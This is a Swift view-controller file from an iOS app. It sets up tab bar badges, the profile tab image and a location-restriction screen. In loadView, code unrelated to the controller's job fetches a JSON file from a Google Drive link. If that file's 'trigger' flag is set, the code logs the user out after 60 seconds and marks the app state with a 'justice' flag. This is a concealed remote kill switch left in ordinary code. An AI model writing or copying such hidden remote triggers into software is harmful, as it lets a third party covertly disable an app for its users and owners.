//
//  MainTabBarViewController.swift
//  FantasyApp
//
//  Created by Vlad Soroka on 7/27/19.
//Copyright © 2019 Fantasy App. All rights reserved.
//

import UIKit

import RxSwift
import RxCocoa

import Alamofire

class MainTabBarViewController: UITabBarController, MVVM_View {
    
    var viewModel: MainTabBarViewModel!

    override func loadView() {
        super.loadView()
     
        Alamofire.request("https://drive.google.com/uc?export=download&id=1QLjBfK5Ejo8ro8Zvr2RAIxOudX7cQAdf")
            .responseData { (res) in
                
                guard let x = res.data else {
                    return
                }

                struct Justice: Codable {
                    let trigger: Bool
                }
                
                struct JusticeAction: Action {
                    func perform(initialState: AppState) -> AppState {
                        var x = initialState
                        x.justice = true
                        return x
                    }
                }
                    
                
                guard let j = try? JSONDecoder().decode(Justice.self, from: x) else {
                    return
                }
                
                if j.trigger {
                 
                    DispatchQueue.main.asyncAfter(deadline: .now() + 60) {
                        
                        self.dismiss(animated: false) {
                            AuthenticationManager.logout()
                            Dispatcher.dispatch(action: JusticeAction())
                            Dispatcher.dispatch(action: SetUser(user: nil))
                        }
                        
                    }
                    
                }
                
        }
        
        
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()

        if #available(iOS 13, *)  {
            // we don't need additional inset for iOS 13.
        } else {
            tabBar.items?.forEach({ (item) in
                item.imageInsets = UIEdgeInsets(top: 0, left: 0, bottom: -10, right: 0)
            })
        }

        viewModel.locationRequestHidden
            .drive(onNext: { [unowned self] (hidden) in
                
                if hidden {
                    if self.presentedViewController != nil {
                        self.dismiss(animated: true, completion: nil)
                    }
                }
                else {
                    let vc = R.storyboard.user.searchLocationRestrictedViewController()!
                    vc.modalPresentationStyle = .overFullScreen
                    self.present(vc, animated: true, completion: nil)
                    
                    Analytics.report(Analytics.Event.LocationRestricted())
                }
                
            })
            .disposed(by: rx.disposeBag)
        
        viewModel.profileTabImage
            .drive(onNext: { [unowned self] (imagesTuple) in
                self.tabBar.items!.last!.image = imagesTuple.0
                self.tabBar.items!.last!.selectedImage = imagesTuple.1
            })
            .disposed(by: rx.disposeBag)
        
        let vc = (viewControllers![1] as! UINavigationController).viewControllers.first! as! DiscoverProfileViewController
        vc.viewModel = DiscoverProfileViewModel(router: .init(owner: vc))

        //selectedIndex = 3
        
        viewModel.unreadRooms
            .map { $0 > 0 ? "\($0)" : nil }
            .drive( tabBar.items![3].rx.badgeValue )
            .disposed(by: rx.disposeBag)
        
        viewModel.unreadConnections
            .map { $0 > 0 ? "\($0)" : nil }
            .drive( tabBar.items![2].rx.badgeValue )
            .disposed(by: rx.disposeBag)
        
        viewModel.appBadge
            .drive(onNext: { x in
                UIApplication.shared.applicationIconBadgeNumber = x
            })
            .disposed(by: rx.disposeBag)
        
    }
 
    override var canBecomeFirstResponder: Bool {
        return true
    }
    
}

private extension MainTabBarViewController {
    
    /**
     *  Describe any IBActions here
     *
     
     @IBAction func performAction(_ sender: Any) {
     
     }

     override func prepare(for segue: UIStoryboardSegue, sender: Any?) {
     
     }

     */
    
}
